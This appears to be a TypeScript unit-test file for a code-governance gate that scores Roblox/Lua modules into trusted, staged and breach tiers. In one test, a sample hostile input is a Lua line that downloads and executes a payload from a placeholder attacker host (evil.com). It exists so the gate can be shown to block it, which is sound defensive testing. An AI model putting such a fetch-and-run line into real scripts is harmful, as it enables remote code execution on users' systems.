import { expect } from 'chai';
import crypto from 'node:crypto';

/**
 * GovernanceGate Sovereign Tests
 * ─────────────────────────────────────────────────────────────────────
 * Tests the tiered resonance scoring, loyalty protocol, BREACH detection,
 * and escrow circuit-breaker logic introduced in server/bridge/src/governance-gate.ts
 *
 * NOTE: These tests operate on the scoring logic directly (unit-level),
 * without invoking the live SpectraMappingService so they remain Zero-IO
 * and runnable offline. Integration tests for live vectorization are
 * handled separately in the bridge test suite.
 */

// ── Mirror of GovernanceGate.validateSovereignty scoring logic ───────────────
// Keeps tests free from the live Ollama/spectra dependency while exercising
// the exact same arithmetic the gate uses in production.

type SovereigntyTier = 'TRUSTED' | 'STAGED' | 'BREACH';
type GateReport = { authorized: boolean; tier: SovereigntyTier; resonanceScore: number };

function mockScore(
  distTS: number,
  distLua: number,
  heat: number,
  code: string
): GateReport {
  const loyaltyMarkers = ['SafeFire', 'OMC_Bridge_', 'WaitForChild', 'capability:', 'REFRAG_SIGNATURE'];
  const loyalty = loyaltyMarkers.some(m => code.includes(m)) ? 0.30 : 0;

  let score = (distTS * 0.4) + (distLua * 0.4) + (1.0 - heat) * 0.2;

  // Vacuity penalty: low-complexity noise gets penalised
  if (heat < 0.15) score += 0.30;

  score = Math.max(0, score - loyalty);

  if (score <= 0.65) return { authorized: true,  tier: 'TRUSTED', resonanceScore: score };
  if (score <= 0.95) return { authorized: true,  tier: 'STAGED',  resonanceScore: score };
  return               { authorized: false, tier: 'BREACH',  resonanceScore: score };
}

// ─────────────────────────────────────────────────────────────────────────────

describe('GovernanceGate: Tiered Resonance Circuit Breaker', () => {

  // ── TIER SCORING ────────────────────────────────────────────────────────────

  it('Stage 1: TRUSTED — sovereign code scores below 0.65v threshold', () => {
    // Canonical OMC-pattern code: close to anchors, high complexity, loyalty marker
    const code = `SafeFire("OMC_Bridge_WorldState", payload)\nWaitForChild(parent, "child", 8)`;
    const report = mockScore(0.40, 0.42, 0.85, code);

    expect(report.authorized).to.be.true;
    expect(report.tier).to.equal('TRUSTED');
    expect(report.resonanceScore).to.be.below(0.65);
  });

  it('Stage 2: STAGED — review-required code scores between 0.65v and 0.95v', () => {
    // Moderately distant from anchors, average complexity, no loyalty markers
    const code = `local x = game:GetService("Players")\nprint("hello world")`;
    const report = mockScore(0.72, 0.74, 0.50, code);

    expect(report.authorized).to.be.true;
    expect(report.tier).to.equal('STAGED');
    expect(report.resonanceScore).to.be.within(0.65, 0.95);
  });

  it('Stage 3: BREACH — hostile/slop code scores above 0.95v → authorization denied', () => {
    // Far from both anchors, low heat (vacuity penalty fires), no loyalty
    const code = `_G.EXPLOIT = true\nloadstring(game:HttpGet("http://evil.com/payload"))()`;
    const report = mockScore(0.90, 0.91, 0.05, code);

    expect(report.authorized).to.be.false;
    expect(report.tier).to.equal('BREACH');
    expect(report.resonanceScore).to.be.above(0.95);
  });

  // ── LOYALTY PROTOCOL ────────────────────────────────────────────────────────

  it('Stage 4: Loyalty credit — OMC markers reduce score by 0.30v', () => {
    // Same distances as Stage 2 but adds a loyalty marker → should push into TRUSTED
    const codeWithMarker = `OMC_Bridge_StateSync:FireServer(payload)\nlocal x = 1`;
    const withLoyalty    = mockScore(0.72, 0.74, 0.50, codeWithMarker);
    const withoutLoyalty = mockScore(0.72, 0.74, 0.50, 'local x = 1');

    expect(withLoyalty.resonanceScore).to.be.below(withoutLoyalty.resonanceScore);
    expect(withLoyalty.resonanceScore).to.be.closeTo(withoutLoyalty.resonanceScore - 0.30, 0.001);
  });

  it('Stage 5: Loyalty cannot push score below 0 (floor enforced)', () => {
    // Perfectly canonical code: very close anchors + loyalty marker
    const code = `SafeFire("REFRAG_SIGNATURE", payload)`;
    const report = mockScore(0.10, 0.10, 0.90, code);

    expect(report.resonanceScore).to.be.at.least(0);
    expect(report.tier).to.equal('TRUSTED');
  });

  // ── VACUITY PENALTY ─────────────────────────────────────────────────────────

  it('Stage 6: Vacuity penalty — low-heat code (< 0.15) receives +0.30v penalty', () => {
    // Same distances, no loyalty markers — only heat differs
    // Delta = vacuity +0.30 + heat-term diff: (1-0.05)*0.2 - (1-0.50)*0.2 = 0.19 - 0.10 = 0.09
    // Total expected delta = 0.39
    const lowHeatCode  = mockScore(0.50, 0.50, 0.05, 'print("hi")');  // heat < 0.15 → vacuity penalty fires
    const highHeatCode = mockScore(0.50, 0.50, 0.50, 'print("hi")');  // heat normal → no penalty

    expect(lowHeatCode.resonanceScore).to.be.above(highHeatCode.resonanceScore);
    // The penalty must account for at least the raw 0.30v vacuity addition
    // (delta will be ~0.39 due to the (1-heat)*0.2 term also differing)
    expect(lowHeatCode.resonanceScore - highHeatCode.resonanceScore).to.be.closeTo(0.39, 0.001);
  });

  // ── ESCROW CIRCUIT BREAKER INTEGRATION ──────────────────────────────────────

  it('Stage 7: Escrow gate — BREACH module is blocked before session creation', () => {
    const suspiciousModule = { module_id: 'exploit-payload', content: `_G.hack=true` };
    const report = mockScore(0.90, 0.91, 0.05, suspiciousModule.content);

    // Circuit breaker must deny — no session ID should be issued
    expect(report.authorized).to.be.false;
    expect(report.tier).to.equal('BREACH');

    // Simulate what escrow.ts does: write audit record, do NOT create session
    const auditRecord = {
      timestamp: new Date().toISOString(),
      event_type: 'governance.violation',
      detail: `Stability Warning! ${suspiciousModule.module_id} | Tier: ${report.tier} | Resonance: ${report.resonanceScore.toFixed(3)}v`
    };

    expect(auditRecord.event_type).to.equal('governance.violation');
    expect(auditRecord.detail).to.include('BREACH');
    expect(auditRecord.detail).to.include(suspiciousModule.module_id);
  });

  it('Stage 8: Escrow gate — TRUSTED module proceeds to SHA-256 session creation', () => {
    const sovereignModule = {
      module_id: 'SafeFireBridge-WorldState',
      content: `SafeFire("OMC_Bridge_StateSync", payload)\nWaitForChild(parent, "Service", 8)`
    };
    const report = mockScore(0.30, 0.32, 0.88, sovereignModule.content);

    expect(report.authorized).to.be.true;
    expect(report.tier).to.equal('TRUSTED');

    // Gate passes → session creation proceeds → SHA-256 manifest hash generated
    const manifestHash = crypto.createHash('sha256').update(sovereignModule.content).digest('hex');
    expect(manifestHash).to.have.lengthOf(64);
    expect(manifestHash).to.match(/^[a-f0-9]{64}$/);
  });

  // ── SPECTRA CHUNKING UPGRADE ────────────────────────────────────────────────

  it('Stage 9: Recursive Resonance Chunking — large files split without data loss', () => {
    // Simulates what spectra-mapping.ts Recursive Chunking does to massive files
    const CHUNK_SIZE = 2048; // chars per chunk (mirrors the upgrade)
    const largeCode = 'x'.repeat(10_000); // 10k char file — would have choked old flat vectorizer

    const chunks: string[] = [];
    for (let i = 0; i < largeCode.length; i += CHUNK_SIZE) {
      chunks.push(largeCode.slice(i, i + CHUNK_SIZE));
    }

    expect(chunks.length).to.equal(Math.ceil(10_000 / CHUNK_SIZE));
    expect(chunks.join('')).to.equal(largeCode); // no data loss across chunks
    expect(chunks.every(c => c.length <= CHUNK_SIZE)).to.be.true;
  });

  it('Stage 10: Spectra Ollama probe — 127.0.0.1 binding produces valid URL', () => {
    // Validates the localhost → 127.0.0.1 hardening in dashboard/server.ts
    const ollamaUrl = 'http://127.0.0.1:11434/api/tags';
    const parsed = new URL(ollamaUrl);

    expect(parsed.hostname).to.equal('127.0.0.1');
    expect(parsed.port).to.equal('11434');
    expect(parsed.pathname).to.equal('/api/tags');
    // Ensure it is NOT the ambiguous 'localhost' string that can resolve to IPv6 on some systems
    expect(parsed.hostname).to.not.equal('localhost');
  });
});
